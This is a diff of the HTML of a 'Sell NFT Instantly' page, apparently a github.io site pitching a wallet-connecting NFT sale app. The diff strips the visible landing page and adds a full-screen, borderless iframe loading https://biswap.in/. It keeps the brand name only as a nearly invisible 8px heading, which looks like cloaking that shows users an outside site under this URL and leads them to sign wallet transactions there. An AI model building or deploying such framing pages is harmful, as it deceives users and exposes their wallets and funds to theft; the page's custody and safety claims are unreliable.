@@ -159,159 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Sell NFT Instantly</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>NFT Exit App</span>
-      <h1>Sell NFT Instantly</h1>
-      <p class="deck">Sell NFT Instantly is a <strong>non-custodial</strong> DeFi app for turning eligible NFTs into wallet-ready liquidity with live pricing, clear costs and approval review before you sign.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Sell NFT Instantly
+  </h1>
 
-      <section class="routebar" aria-label="NFT sale preview">
-        <div class="rhead">
-          <span class="ct">NFT sale</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You sell</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="nft.png" alt="NFT">NFT <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Asset in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Sale route, liquidity and network costs are shown live in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why sell here</span>
-        <h2 class="h2">Built for NFT sellers who want speed without surrendering custody</h2>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Non-custodial selling flow</h3><p>You keep the NFT in your wallet until you approve and sign. The <a class="cite" href="https://sell-nft-instantly.github.io/" rel="nofollow noopener noreferrer">Sell NFT Instantly app</a> is designed around wallet confirmation, not deposits or hosted accounts.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built for recognizable NFT assets</h3><p>Use the app to review supported NFT collections, wallet assets and chain availability. It fits <a class="cite" href="https://ethereum.org/en/nft/" rel="nofollow noopener noreferrer">NFT ownership</a> patterns where the asset, approval and sale transaction stay visible before confirmation.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Transparent liquidity review</h3><p>See the live quote, buyer-side liquidity, approval request and <a class="cite" href="https://etherscan.io/gastracker" rel="nofollow noopener noreferrer">network gas context</a> before you confirm. If the route is not attractive, you can walk away without sending the NFT.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Sell NFT Instantly in three wallet-led steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app, connect your Web3 wallet and let the interface read eligible NFTs without taking custody of the asset.</p></div>
-        <div class="step"><span class="num">2</span><h3>Select the NFT to sell</h3><p>Choose the collection item and payout asset. The app checks supported chains, available liquidity and executable sale paths at the moment you request a quote.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and sign</h3><p>Confirm only after the sale route, estimated timing, network cost and approval details make sense. Settlement depends on the chain and the final wallet transaction.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Common questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is Sell NFT Instantly?</h3><p>It is a non-custodial DeFi app for selling eligible NFTs from your wallet. It uses wallet connection, live quote review and standards-aware NFT handling such as <a class="cite" href="https://eips.ethereum.org/EIPS/eip-721" rel="nofollow noopener noreferrer">ERC-721 tokens</a> where supported.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>How fast can an NFT sale happen?</h3><p>The app can prepare an immediate sale path when supported liquidity is available. Final timing depends on wallet approval, market liquidity, network conditions and the transaction you choose to sign.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains and assets are supported?</h3><p>The app focuses on supported NFT collections and payout assets available in the interface. See the current list on the <a href="supported-chains/">supported chains</a> page before you connect.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>What does it cost to sell?</h3><p>Any marketplace, liquidity route or network cost is shown in the app before confirmation. Your wallet may also show contract approval details through tools such as <a class="cite" href="https://walletconnect.com/" rel="nofollow noopener noreferrer">wallet connection</a> prompts.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Sell NFT Instantly</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The full walkthrough for connecting a wallet, choosing an NFT and reviewing the sale before signing.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>How self-custody, approval review and wallet confirmation help keep the sale process under your control.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The networks, NFT assets and payout routes available inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Sell NFT Instantly</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://sell-nft-instantly.github.io/#website","url":"https://sell-nft-instantly.github.io/","name":"Sell NFT Instantly"},
-    {"@type":"Organization","@id":"https://sell-nft-instantly.github.io/#org","name":"Sell NFT Instantly","url":"https://sell-nft-instantly.github.io/","logo":"https://sell-nft-instantly.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Sell NFT Instantly","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://sell-nft-instantly.github.io/","browserRequirements":"Requires a Web3 wallet","offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"description":"Non-custodial DeFi app for selling eligible NFTs from a wallet-native interface with live quotes, visible costs and approval review."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is Sell NFT Instantly?","acceptedAnswer":{"@type":"Answer","text":"It is a non-custodial DeFi app for selling eligible NFTs from your wallet. It uses wallet connection, live quote review and standards-aware NFT handling where supported."}},
-      {"@type":"Question","name":"How fast can an NFT sale happen?","acceptedAnswer":{"@type":"Answer","text":"The app can prepare an immediate sale path when supported liquidity is available. Final timing depends on wallet approval, market liquidity, network conditions and the transaction you choose to sign."}},
-      {"@type":"Question","name":"Which chains and assets are supported?","acceptedAnswer":{"@type":"Answer","text":"The app focuses on supported NFT collections and payout assets available in the interface. See the current list on the supported chains page before you connect."}},
-      {"@type":"Question","name":"What does it cost to sell?","acceptedAnswer":{"@type":"Answer","text":"Any marketplace, liquidity route or network cost is shown in the app before confirmation. Your wallet may also show contract approval details before you sign."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
